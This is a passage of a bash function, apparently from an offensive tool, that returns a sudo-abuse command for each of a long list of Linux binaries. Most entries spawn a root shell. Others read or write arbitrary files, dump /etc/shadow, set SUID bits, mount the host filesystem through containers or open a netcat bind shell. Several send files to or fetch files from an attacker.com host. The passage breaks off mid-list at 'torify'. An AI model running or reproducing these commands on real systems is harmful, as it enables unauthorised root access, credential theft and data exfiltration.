get_sudo_exploit() {
  local b="$1"
  case "$b" in
    7z) echo '7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so' ;;
    R) echo 'R --no-save -e '\''system("/bin/sh")'\''' ;;
    aa-exec) echo 'aa-exec /bin/sh' ;;
    ab) echo 'ab -v2 http://attacker.com/path/to/input-file' ;;
    acr) echo 'echo -e '\''x:\\n\\t/bin/sh 1>&0 2>&0'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
acr -r ./relative/path/to/temp-file' ;;
    alpine) echo 'alpine -F /path/to/input-file' ;;
    ansible-playbook) echo 'echo '\''[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'\'' >/path/to/temp-file
ansible-playbook /path/to/temp-file' ;;
    ansible-test) echo 'ansible-test shell' ;;
    aoss) echo 'aoss /bin/sh' ;;
    apache2) echo 'apache2 -f /path/to/input-file' ;;
    apache2ctl) echo 'apache2ctl -c '\''Include /path/to/input-file'\''' ;;
    apt-get) echo 'echo '\''Dpkg::Pre-Invoke {"/bin/sh;false"}'\'' >/path/to/temp-file
apt-get -y install -c /path/to/temp-file sl' ;;
    aptitude) echo 'aptitude changelog aptitude' ;;
    ar) echo 'ar r /path/to/output-file /path/to/input-file
ar p /path/to/output-file' ;;
    arch-nspawn) echo 'mkdir -p ./etc/
grep -oP "^CHROOT_VERSION='\''\\K[^'\'']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot
touch ./etc/pacman.conf
echo '\''CARCH=true;/bin/sh;exit'\'' >etc/makepkg.conf
arch-nspawn .' ;;
    aria2c) echo 'echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain' ;;
    arj) echo 'arj a /path/to/output-file /path/to/input-file
arj p /path/to/output-file' ;;
    arp) echo 'arp -v -f /path/to/input-file' ;;
    as) echo 'as @/path/to/input-file' ;;
    ascii-xfr) echo 'ascii-xfr -ns /path/to/input-file' ;;
    ascii85) echo 'ascii85 /path/to/input-file | ascii85 --decode' ;;
    ash) echo 'ash' ;;
    aspell) echo 'aspell -c /path/to/input-file' ;;
    asterisk) echo 'asterisk -r
!/bin/sh' ;;
    at) echo 'echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null' ;;
    atobm) echo 'atobm /path/to/input-file' ;;
    autoconf) echo 'echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoconf' ;;
    autoheader) echo 'echo '\''/bin/sh 1>&0'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoheader' ;;
    autoreconf) echo 'echo '\''/bin/sh 1>&0'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
echo AC_INIT >configure.ac
AUTOM4TE=/path/to/temp-file autoreconf' ;;
    aws) echo 'aws ec2 describe-instances --filter file:///path/to/input-file' ;;
    base32) echo 'base32 /path/to/input-file | base32 --decode' ;;
    base58) echo 'base58 /path/to/input-file | base58 --decode' ;;
    base64) echo 'base64 /path/to/input-file | base64 --decode' ;;
    basenc) echo 'basenc --base64 /path/to/input-file | basenc -d --base64' ;;
    basez) echo 'basez /path/to/input-file | basez --decode' ;;
    bash) echo 'bash' ;;
    bashbug) echo 'bashbug' ;;
    batcat) echo 'batcat --paging always /etc/hosts' ;;
    bbot) echo 'bbot -d -cy /path/to/input-file' ;;
    bc) echo 'bc -s /path/to/input-file
quit' ;;
    bconsole) echo 'bconsole
@exec /bin/sh' ;;
    borg) echo 'borg extract @:/::: --rsh "/bin/sh -c '\''/bin/sh </dev/tty >/dev/tty 2>/dev/tty'\''"' ;;
    bpftrace) echo 'bpftrace --unsafe -e '\''BEGIN {system("/bin/sh 1<&0");exit()}'\''' ;;
    bridge) echo 'bridge -b /path/to/input-file' ;;
    bundle) echo 'BUNDLE_GEMFILE=x bundle exec /bin/sh' ;;
    busctl) echo 'busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='\''/bin/sh -i 0<&2 1>&2'\''' ;;
    busybox) echo 'busybox ash' ;;
    byebug) echo 'byebug --no-stop /path/to/script.rb' ;;
    bzip2) echo 'bzip2 -c /path/to/input-file | bzip2 -d' ;;
    cabal) echo 'cabal exec --project-file=/dev/null -- /bin/sh' ;;
    cancel) echo 'cancel -h attacker.com:12345 -u DATA' ;;
    capsh) echo 'capsh --' ;;
    cargo) echo 'cargo help doc' ;;
    cat) echo 'cat /path/to/input-file' ;;
    cdist) echo 'cdist shell -s /bin/sh' ;;
    certbot) echo 'certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '\''/bin/sh 1>&0 2>&0'\''' ;;
    chattr) echo 'chattr +i /path/to/input-file' ;;
    check_by_ssh) echo 'check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x' ;;
    check_cups) echo 'check_cups --extra-opts=@/path/to/input-file' ;;
    check_log) echo 'check_log -F /path/to/input-file -O /dev/stdout' ;;
    check_memory) echo 'check_memory --extra-opts=@/path/to/input-file' ;;
    check_raid) echo 'check_raid --extra-opts=@/path/to/input-file' ;;
    check_ssl_cert) echo 'echo '\''exec /bin/sh 0<&2 1>&2'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
check_ssl_cert --grep-bin /path/to/temp-file -H x' ;;
    check_statusfile) echo 'check_statusfile /path/to/input-file' ;;
    chmod) echo 'chmod 6777 /path/to/input-file' ;;
    choom) echo 'choom -n 0 /bin/sh' ;;
    chown) echo 'chown $(id -un):$(id -gn) /path/to/input-file' ;;
    chroot) echo 'chroot /' ;;
    chrt) echo 'chrt 1 /bin/sh' ;;
    clamscan) echo 'touch x.yara
clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE '\''s/^(.*): No such file or directory$/\\1/p'\''' ;;
    clisp) echo 'clisp -x '\''(ext:run-shell-command "/bin/sh")(ext:exit)'\''' ;;
    cmake) echo 'echo '\''execute_process(COMMAND /bin/sh)'\'' >/path/to/CMakeLists.txt
cmake /path/to/' ;;
    cmp) echo 'cmp /path/to/input-file /dev/zero -b -l' ;;
    cobc) echo 'echo '\''CALL "SYSTEM" USING "/bin/sh".'\'' >/path/to/temp-file
cobc -xFj --frelax-syntax-checks /path/to/temp-file' ;;
    code) echo 'code tunnel --name xxxxxx' ;;
    codex) echo 'codex sandbox linux /bin/sh' ;;
    column) echo 'column /path/to/input-file' ;;
    comm) echo 'comm /path/to/input-file /dev/null' ;;
    composer) echo 'echo '\''{"scripts":{"x":"/bin/sh"}}'\'' >composer.json
composer run-script x' ;;
    cowsay) echo 'cowsay -f /path/to/script.pl x' ;;
    cowthink) echo 'cowthink -f /path/to/script.pl x' ;;
    cp) echo 'cp /path/to/input-file /dev/stdout' ;;
    cpio) echo 'echo '\''/bin/sh </dev/tty >/dev/tty'\'' >localhost
cpio -o --rsh-command /bin/sh -F localhost:' ;;
    cpulimit) echo 'cpulimit -l 100 -f -- /bin/sh' ;;
    crash) echo 'CRASHPAGER=/path/to/command crash -h' ;;
    crontab) echo 'crontab -e' ;;
    csh) echo 'csh' ;;
    csplit) echo 'csplit /path/to/input-file 1
cat xx01' ;;
    csvtool) echo 'csvtool call '\''/bin/sh;false'\'' /etc/hosts' ;;
    ctr) echo 'ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x' ;;
    cupsfilter) echo 'cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file' ;;
    curl) echo 'curl http://attacker.com/path/to/input-file -o /path/to/output-file' ;;
    cut) echo 'cut -d '\'''\'' -f1 /path/to/input-file' ;;
    dash) echo 'dash' ;;
    date) echo 'date -f /path/to/input-file' ;;
    dc) echo 'dc -e '\''!/bin/sh'\''' ;;
    dd) echo 'dd if=/path/to/input-file' ;;
    debugfs) echo 'debugfs
!/bin/sh' ;;
    dhclient) echo 'dhclient -sf /bin/sh' ;;
    dialog) echo 'dialog --textbox /path/to/input-file 0 0' ;;
    diff) echo 'diff --line-format=%L /dev/null /path/to/input-file' ;;
    dig) echo 'dig -f /path/to/input-file' ;;
    distcc) echo 'distcc /bin/sh' ;;
    dmesg) echo 'dmesg -rF /path/to/input-file' ;;
    dmsetup) echo 'dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '\''/bin/sh -s'\''' ;;
    dnf) echo 'dnf install -y x-1.0-1.noarch.rpm --disablerepo=*' ;;
    dnsmasq) echo 'dnsmasq --conf-script='\''/path/to/command 1>&2'\''' ;;
    doas) echo 'doas -u root /bin/sh' ;;
    docker) echo 'docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh' ;;
    dos2unix) echo 'dos2unix -f -O /path/to/input-file' ;;
    dosbox) echo 'dosbox -c '\''mount c /'\'' -c '\''type c:\\path\\to\\input'\''' ;;
    dotnet) echo 'dotnet fsi
System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;' ;;
    dpkg) echo 'dpkg -i x_1.0_all.deb' ;;
    dstat) echo 'dstat --xxx' ;;
    dvips) echo 'dvips -R0 texput.dvi' ;;
    easyrsa) echo 'echo '\''set_var X "$(/bin/sh 1>&0)"'\'' >/path/to/temp-file
easyrsa --vars=/path/to/temp-file' ;;
    eb) echo 'eb logs' ;;
    ed) echo 'ed
!/bin/sh
q' ;;
    efax) echo 'efax -d /path/to/input-file' ;;
    egrep) echo 'grep '\'''\'' /path/to/input-file' ;;
    elvish) echo 'elvish' ;;
    emacs) echo 'emacs -Q -nw --eval '\''(term "/bin/sh")'\''' ;;
    enscript) echo 'enscript /dev/null -qo /dev/null -I '\''/bin/sh >&2'\''' ;;
    env) echo 'env /bin/sh' ;;
    eqn) echo 'eqn /path/to/input-file' ;;
    espeak) echo 'espeak -qXf /path/to/input-file' ;;
    ex) echo 'ex -c '\'':!/bin/sh'\''' ;;
    exiftool) echo 'exiftool -filename=/path/to/output-file /path/to/input-file
cat /path/to/output-file' ;;
    expand) echo 'expand /path/to/input-file' ;;
    expect) echo 'expect -c '\''spawn /bin/sh;interact'\''' ;;
    facter) echo 'FACTERLIB=/path/to/dir/ facter' ;;
    fail2ban-client) echo 'fail2ban-client add x
fail2ban-client set x addaction x
fail2ban-client set x action x actionban /path/to/command
fail2ban-client start x
fail2ban-client set x banip 999.999.999.999
fail2ban-client set x unbanip 999.999.999.999
fail2ban-client stop x' ;;
    fastfetch) echo 'echo '\''{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}'\'' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc' ;;
    ffmpeg) echo 'ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
reset^J' ;;
    fgrep) echo 'grep '\'''\'' /path/to/input-file' ;;
    file) echo 'file -f /path/to/input-file' ;;
    find) echo 'find . -exec /bin/sh \\; -quit' ;;
    finger) echo 'finger x@attacker.com' ;;
    firejail) echo 'firejail /bin/sh' ;;
    fish) echo 'fish' ;;
    flock) echo 'flock -u / /bin/sh' ;;
    fmt) echo 'fmt -pNON_EXISTING_PREFIX /path/to/input-file' ;;
    fold) echo 'fold -w999 /path/to/input-file' ;;
    forge) echo 'echo '\''#!/bin/sh'\'' >/path/to/temp-file
echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file
chmod +x /path/to/temp-file
forge build --use /path/to/temp-file' ;;
    fping) echo 'fping -f /path/to/input-file' ;;
    ftp) echo 'ftp
!/bin/sh' ;;
    fzf) echo 'fzf --bind '\''enter:execute(/bin/sh)'\''' ;;
    gawk) echo 'gawk '\''BEGIN {system("/bin/sh")}'\''' ;;
    gcc) echo 'gcc -wrapper /bin/sh,-s x' ;;
    gcloud) echo 'gcloud help' ;;
    gcore) echo 'gcore $PID' ;;
    gdb) echo 'gdb -nx -ex '\''dump value /path/to/output-file "DATA"'\'' -ex quit' ;;
    gem) echo 'gem open -e '\''/bin/sh -s'\'' debug' ;;
    genie) echo 'genie -c '\''/bin/sh'\''' ;;
    genisoimage) echo 'genisoimage -q -o - /path/to/input-file' ;;
    getent) echo 'getent shadow' ;;
    ghc) echo 'ghc -e '\''System.Process.callCommand "/bin/sh"'\''' ;;
    ghci) echo 'ghci
System.Process.callCommand "/bin/sh"' ;;
    ginsh) echo 'ginsh
!/bin/sh' ;;
    git) echo 'PAGER='\''/bin/sh -c "exec sh 0<&1"'\'' git -p help' ;;
    gnuplot) echo 'gnuplot -e '\''system("/bin/sh 1>&0")'\''' ;;
    go) echo 'echo -e '\''package main\\nimport "syscall"\\nfunc main(){\\n\\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, []string{})\\n}'\'' >/path/to/temp-file.go
go run /path/to/temp-file.go' ;;
    grc) echo 'grc --pty /bin/sh' ;;
    grep) echo 'grep '\'''\'' /path/to/input-file' ;;
    gtester) echo 'echo '\''exec /bin/sh 0<&1'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
gtester -q /path/to/temp-file' ;;
    guile) echo 'guile -c '\''(system "/bin/sh")'\''' ;;
    gzip) echo 'gzip -c /path/to/input-file | gzip -d' ;;
    hashcat) echo 'echo -n DATA | tee /path/to/wordlist | md5sum | awk '\''{print $1}'\'' >/path/to/hash
hashcat -m 0 --quiet --potfile-disable -o /path/to/output-file --outfile-format=2 --outfile-autohex-disable /path/to/hash /path/to/wordlist' ;;
    head) echo 'head -c-0 /path/to/input-file' ;;
    hexdump) echo 'hd /path/to/input-file' ;;
    hg) echo 'hg --config alias.x='\''!/bin/sh'\'' x' ;;
    highlight) echo 'highlight --no-doc --failsafe /path/to/input-file' ;;
    hping3) echo 'hping3
/bin/sh' ;;
    iconv) echo 'iconv -f 8859_1 -t 8859_1 /path/to/input-file' ;;
    iftop) echo 'iftop
!/bin/sh' ;;
    install) echo 'install -m 6777 /path/to/input-file /path/to/output-dir/' ;;
    ionice) echo 'ionice /bin/sh' ;;
    ip) echo 'ip netns add foo
ip netns exec foo /bin/sh
ip netns delete foo' ;;
    iptables-save) echo 'iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA
iptables -S
iptables-save -f /path/to/output-file' ;;
    ispell) echo 'ispell /etc/hosts
!/bin/sh' ;;
    java) echo 'java Shell' ;;
    jjs) echo 'jjs
Java.type('\''java.lang.Runtime'\'').getRuntime().exec('\''/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty'\'').waitFor()' ;;
    joe) echo 'joe
^K!/bin/sh' ;;
    join) echo 'join -a 2 /dev/null /path/to/input-file' ;;
    journalctl) echo 'journalctl' ;;
    jq) echo 'jq -Rr . /path/to/input-file' ;;
    jrunscript) echo 'jrunscript -e '\''exec("/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty")'\''' ;;
    jshell) echo 'jshell
Runtime.getRuntime().exec("/path/to/command");' ;;
    jtag) echo 'jtag --interactive
shell /bin/sh' ;;
    julia) echo 'julia -e '\''run(`/bin/sh`)'\''' ;;
    ksshell) echo 'ksshell -i /path/to/input-file' ;;
    ksu) echo 'ksu -q -e /bin/sh' ;;
    kubectl) echo 'cat >/path/to/temp-file <<EOF
clusters:
- cluster:
    server: https://x
  name: x
contexts:
- context:
    cluster: x
    user: x
  name: x
current-context: x
users:
- name: x
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      interactiveMode: Always
      command: /bin/sh
      args:
        - '\''-c'\''
        - '\''/bin/sh 0<&2 1>&2'\''
EOF

kubectl get pods --kubeconfig=/path/to/temp-file' ;;
    last) echo 'last -a -f /path/to/input-file' ;;
    latex) echo 'latex --shell-escape '\''\\immediate\\write18{/bin/sh}'\''' ;;
    latexmk) echo 'echo '\''\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/path/to/input-file}\\end{document}'\'' >/path/to/temp-file
latexmk -dvi /path/to/temp-file
strings temp-file.dvi' ;;
    ld.so) echo '/path/to/ld.so /bin/sh' ;;
    ldconfig) echo 'echo /path/to/temp-dir/ >/path/to/temp-file
ldconfig -f /path/to/temp-file
ping' ;;
    less) echo 'less /etc/hosts
!/bin/sh' ;;
    lftp) echo 'lftp -c '\''!/bin/sh'\''' ;;
    links) echo 'links /path/to/input-file' ;;
    ln) echo 'ln -fs /bin/sh /bin/ln
ln' ;;
    loginctl) echo 'loginctl user-status
!/bin/sh' ;;
    logrotate) echo 'echo -e '\''/path/to/temp-file.config {\\nmail x@x.x\\n}'\'' >/path/to/temp-file.config
echo '\''/bin/sh 0<&2 1>&2'\'' >/path/to/temp-file.sh
logrotate -m /path/to/temp-file.sh -f /path/to/temp-file' ;;
    logsave) echo 'logsave /dev/null /bin/sh -i' ;;
    look) echo 'look '\'''\'' /path/to/input-file' ;;
    lp) echo 'lp /path/to/input-file -h attacker.com' ;;
    ltrace) echo 'ltrace -b -L /bin/sh' ;;
    lua) echo 'lua -e '\''os.execute("/bin/sh")'\''' ;;
    lwp-download) echo 'lwp-download http://attacker.com/path/to/input-file /path/to/output-file' ;;
    lwp-request) echo 'lwp-request file:///path/to/input-file' ;;
    lxd) echo 'lxc init ubuntu:16.04 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh' ;;
    m4) echo 'echo '\''esyscmd(/bin/sh 0<&2 1>&2)'\'' | m4' ;;
    mail) echo 'mail --exec='\''!/bin/sh'\''' ;;
    make) echo 'make --eval='\''$(shell /bin/sh 1>&0)'\'' .' ;;
    man) echo 'man '\''-H/bin/sh #'\'' man' ;;
    mawk) echo 'mawk '\''BEGIN {system("/bin/sh")}'\''' ;;
    minicom) echo 'minicom -D /dev/null' ;;
    more) echo 'more /etc/hosts
!/bin/sh' ;;
    mosh-server) echo 'mosh --server=mosh-server localhost /bin/sh' ;;
    mosquitto) echo 'mosquitto -c /path/to/input-file' ;;
    mount) echo 'mount -o bind /bin/sh /bin/mount
mount' ;;
    msfconsole) echo 'msfconsole
irb' ;;
    msgattrib) echo 'msgattrib -P /path/to/input-file' ;;
    msgcat) echo 'msgcat -P /path/to/input-file' ;;
    msgconv) echo 'msgconv -P /path/to/input-file' ;;
    msgfilter) echo 'echo x | msgfilter -P /bin/sh -c '\''/bin/sh 0<&2 1>&2; kill $PPID'\''' ;;
    msgmerge) echo 'msgmerge -P /path/to/input-file /dev/null' ;;
    msguniq) echo 'msguniq -P /path/to/input-file' ;;
    mtr) echo 'mtr --raw -F /path/to/input-file' ;;
    multitime) echo 'multitime /bin/sh' ;;
    mutt) echo 'mutt -F /path/to/input-file' ;;
    mv) echo 'echo DATA >/path/to/temp-file
mv /path/to/temp-file /path/to/output-file' ;;
    mypy) echo 'mypy /path/to/input-file' ;;
    mysql) echo 'mysql -e '\''\\! /bin/sh'\''' ;;
    nano) echo 'nano
^R^X
reset; sh 1>&0 2>&0' ;;
    nasm) echo 'nasm -@ /path/to/input-file' ;;
    nc) echo 'nc -l -p 12345 -e /bin/sh' ;;
    ncdu) echo 'ncdu
b' ;;
    ncftp) echo 'ncftp
!/bin/sh' ;;
    neofetch) echo 'echo '\''exec /bin/sh'\'' >/path/to/temp-file
neofetch --config /path/to/temp-file' ;;
    nft) echo 'nft -f /path/to/input-file' ;;
    nginx) echo 'cat >/path/to/temp-file <<EOF
user root;
http {
  server {
    listen 80;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c /path/to/temp-file' ;;
    nice) echo 'nice /bin/sh' ;;
    nl) echo 'nl -bn -w1 -s '\'''\'' /path/to/input-file' ;;
    nm) echo 'nm /path/to/input-file' ;;
    nmap) echo 'nmap -iL /path/to/input-file' ;;
    node) echo 'node -e '\''require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'\''' ;;
    nohup) echo 'nohup /bin/sh -c '\''/bin/sh </dev/tty >/dev/tty 2>/dev/tty'\''' ;;
    npm) echo 'npm exec /bin/sh' ;;
    nroff) echo 'echo /bin/sh >groff
chmod +x groff
GROFF_BIN_PATH=. nroff' ;;
    nsenter) echo 'nsenter /bin/sh' ;;
    ntpdate) echo 'ntpdate -a x -k /path/to/input-file -d localhost' ;;
    octave) echo 'octave-cli --eval '\''system("/bin/sh")'\''' ;;
    od) echo 'od -An -c -w999 /path/to/input-file' ;;
    opencode) echo 'opencode
! /path/to/command' ;;
    openssl) echo 'openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file' ;;
    openvpn) echo 'openvpn --dev null --script-security 2 --up '\''/bin/sh -s'\''' ;;
    openvt) echo 'openvt -- /path/to/command' ;;
    opkg) echo 'rpm opkg install x_1.0_all.deb' ;;
    pandoc) echo 'pandoc -t plain /path/to/input-file' ;;
    passwd) echo 'echo -e '\''x\\nx'\'' | passwd' ;;
    paste) echo 'paste /path/to/input-file' ;;
    pax) echo 'pax -w /path/to/input-file | tar -xO' ;;
    pdflatex) echo 'pdflatex --shell-escape '\''\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\''' ;;
    pdftex) echo 'pdftex --shell-escape '\''\\write18{/bin/sh}\\end'\''' ;;
    perf) echo 'perf stat /bin/sh' ;;
    perl) echo 'perl -e '\''exec "/bin/sh"'\''' ;;
    perlbug) echo 'perlbug -s '\''x x x'\'' -r x -c x -e '\''exec /bin/sh #'\''' ;;
    pexec) echo 'pexec /bin/sh' ;;
    pg) echo 'pg /etc/hosts
!/bin/sh' ;;
    php) echo 'php -r '\''system("/bin/sh -i");'\''' ;;
    pic) echo 'pic -U
.PS
sh X sh X' ;;
    pidstat) echo 'pidstat -e /bin/sh' ;;
    pkexec) echo 'pkexec /bin/sh' ;;
    pkg) echo 'pkg install -y --no-repo-update ./x-1.0.txz' ;;
    plymouth) echo 'plymouth ask-for-password --prompt=x --command=/bin/sh' ;;
    podman) echo 'podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh' ;;
    posh) echo 'posh' ;;
    pr) echo 'pr -T /path/to/input-file' ;;
    procmail) echo 'echo -e '\'':0\\n| /path/to/command >/path/to/temp-file
procmail -m /path/to/temp-file' ;;
    pry) echo 'pry' ;;
    psftp) echo 'psftp
!/bin/sh' ;;
    psql) echo 'psql
\\! /bin/sh' ;;
    ptx) echo 'ptx -w 999 /path/to/input-file' ;;
    puppet) echo 'puppet apply -e "exec { '\''/bin/sh <$(tty) >$(tty) 2>$(tty)'\'': }"' ;;
    pwsh) echo 'pwsh' ;;
    pygmentize) echo 'pygmentize -l text /path/to/input-file' ;;
    pyright) echo 'pyright /path/to/input-file' ;;
    python) echo 'python -c '\''import os; os.execl("/bin/sh", "sh")'\''' ;;
    qpdf) echo 'qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
qpdf --show-attachment=x /path/to/output-file' ;;
    rake) echo 'rake -f /path/to/input-file' ;;
    ranger) echo 'ranger
S' ;;
    rc) echo 'rc' ;;
    readelf) echo 'readelf -a @/path/to/input-file' ;;
    redcarpet) echo 'redcarpet /path/to/input-file' ;;
    redis) echo 'redis-cli -h 127.0.0.1
config set dir /path/to/output-dir/
config set dbfilename output-file
set x "DATA"
save' ;;
    restic) echo 'RESTIC_PASSWORD_COMMAND='\''/bin/sh -c "/bin/sh 0<&2 1<&2"'\'' restic backup' ;;
    rev) echo 'rev /path/to/input-file | rev' ;;
    rlogin) echo 'rlogin -l DATA -p 12345 attacker.com' ;;
    rlwrap) echo 'rlwrap /bin/sh' ;;
    rpm) echo 'rpm -ivh x-1.0-1.noarch.rpm' ;;
    rsync) echo 'rsync -e '\''/bin/sh -c "/bin/sh 0<&2 1>&2"'\'' x:x' ;;
    rsyslogd) echo 'cat >/path/to/temp-file <<EOF
module(load="imuxsock")
:msg, contains, "somerandomstring" ^/path/to/command
EOF

rsyslogd -f /path/to/temp-file' ;;
    rtorrent) echo 'echo '\''execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"'\'' >~/.rtorrent.rc
rtorrent' ;;
    ruby) echo 'ruby -e '\''exec "/bin/sh"'\''' ;;
    run-mailcap) echo 'run-mailcap --action=view text/plain:/etc/hosts' ;;
    run-parts) echo 'run-parts --new-session --regex '\''^sh$'\'' /bin' ;;
    runscript) echo 'echo '\''! exec /bin/sh'\'' >/path/to/temp-file
runscript /path/to/temp-file' ;;
    rustc) echo 'rustc /path/to/input-file' ;;
    rustdoc) echo 'rustdoc /path/to/input-file' ;;
    rustfmt) echo 'rustfmt /path/to/input-file' ;;
    rustup) echo 'mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
cp /bin/sh /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc' ;;
    sash) echo 'sash' ;;
    scanmem) echo 'scanmem
shell /bin/sh' ;;
    scp) echo 'echo '\''exec /bin/sh 0<&2 1>&2'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
scp -S /path/to/temp-file x x:' ;;
    screen) echo 'screen' ;;
    script) echo 'script -q /dev/null' ;;
    scrot) echo 'scrot -e /bin/sh' ;;
    sed) echo 'sed -n '\''1e exec /bin/sh 1>&0'\'' /etc/hosts' ;;
    service) echo 'service ../../bin/sh' ;;
    setarch) echo 'setarch -3 /bin/sh' ;;
    setcap) echo 'setcap cap_setuid+ep /path/to/command' ;;
    setfacl) echo 'setfacl -m u:$(id -un):rwx /path/to/input-file' ;;
    setlock) echo 'setlock - /bin/sh' ;;
    sftp) echo 'sftp user@attacker.com
!/bin/sh' ;;
    sg) echo 'sg root' ;;
    shred) echo 'shred -u /path/to/output-file' ;;
    shuf) echo 'shuf -z /path/to/input-file' ;;
    slsh) echo 'slsh -e '\''system("/bin/sh")'\''' ;;
    smbclient) echo 'smbclient '\''\\\\host\\share'\''
!/bin/sh' ;;
    snap) echo 'snap install xxxx_1.0_all.snap --dangerous --devmode' ;;
    socat) echo 'socat - exec:/bin/sh,pty,ctty,raw,echo=0' ;;
    socket) echo 'socket -svp '\''/bin/sh -i'\'' 12345' ;;
    soelim) echo 'soelim /path/to/input-file' ;;
    softlimit) echo 'softlimit /bin/sh' ;;
    sort) echo 'sort -m /path/to/input-file' ;;
    split) echo 'split --filter='\''/bin/sh -i 0<&2 1>&2'\'' /etc/hosts' ;;
    sqlite3) echo 'sqlite3 /dev/null '\''.shell /bin/sh'\''' ;;
    ss) echo 'ss -a -F /path/to/input-file' ;;
    ssh) echo 'ssh localhost /bin/sh' ;;
    ssh-agent) echo 'ssh-agent /bin/sh' ;;
    ssh-copy-id) echo 'ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com' ;;
    ssh-keygen) echo 'ssh-keygen -D /path/to/lib.so' ;;
    ssh-keyscan) echo 'ssh-keyscan -f /path/to/input-file' ;;
    sshfs) echo 'echo -e '\''/bin/sh </dev/tty >/dev/tty 2>/dev/tty'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/' ;;
    sshpass) echo 'sshpass /bin/sh' ;;
    sshuttle) echo 'sudo sshuttle -r x --ssh-cmd '\''/bin/sh -c "/bin/sh 0<&2 1>&2"'\'' localhost' ;;
    start-stop-daemon) echo 'start-stop-daemon -S -x /bin/sh' ;;
    stdbuf) echo 'stdbuf -i0 /bin/sh' ;;
    strace) echo 'strace -o /dev/null /bin/sh' ;;
    strings) echo 'strings /path/to/input-file' ;;
    su) echo 'su -c /bin/sh' ;;
    sudo) echo 'sudo /bin/sh' ;;
    sysctl) echo 'sysctl '\''kernel.core_pattern=|/path/to/command'\''' ;;
    systemctl) echo 'echo '\''[Service]
Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target'\'' >/path/to/temp-file.service
systemctl link /path/to/temp-file.service
systemctl enable --now /path/to/temp-file.service' ;;
    systemd-resolve) echo 'systemd-resolve --status' ;;
    systemd-run) echo 'systemd-run -S' ;;
    tac) echo 'tac -s '\''RANDOM'\'' /path/to/input-file' ;;
    tail) echo 'tail -c+0 /path/to/input-file' ;;
    tailscale) echo 'tailscale serve --http=12345 /path/to/input-file' ;;
    tar) echo 'tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh' ;;
    task) echo 'task execute /bin/sh' ;;
    taskset) echo 'taskset 1 /bin/sh' ;;
    tasksh) echo 'tasksh
!/bin/sh' ;;
    tbl) echo 'tbl /path/to/input-file' ;;
    tclsh) echo 'tclsh' ;;
    tcpdump) echo 'echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file -Z root' ;;
    tcsh) echo 'tcsh' ;;
    tdbtool) echo 'tdbtool
! /bin/sh' ;;
    tee) echo 'echo DATA | tee /path/to/output-file' ;;
    telnet) echo 'telnet
!/bin/sh' ;;
    terraform) echo 'terraform console
file("/path/to/input-file")' ;;
    tex) echo 'tex --shell-escape '\''\\immediate\\write18{/bin/sh}'\''' ;;
    tftp) echo 'tftp attacker.com
get /path/to/input-file' ;;
    tic) echo 'tic -C /path/to/input-file' ;;
    time) echo 'time /bin/sh' ;;
    timedatectl) echo 'timedatectl list-timezones' ;;
    timeout) echo 'timeout 0 /bin/sh' ;;
    tmate) echo 'tmate -c /bin/sh' ;;
    tmux) echo 'tmux -c /bin/sh' ;;
    top) echo 'echo -e '\''pipe\\tx\\texec /bin/sh 1>&0 2>&0'\'' >>~/.config/procps/toprc
top
# press return twice
reset' ;;
    torify) echo 'torify /bin/sh' ;;
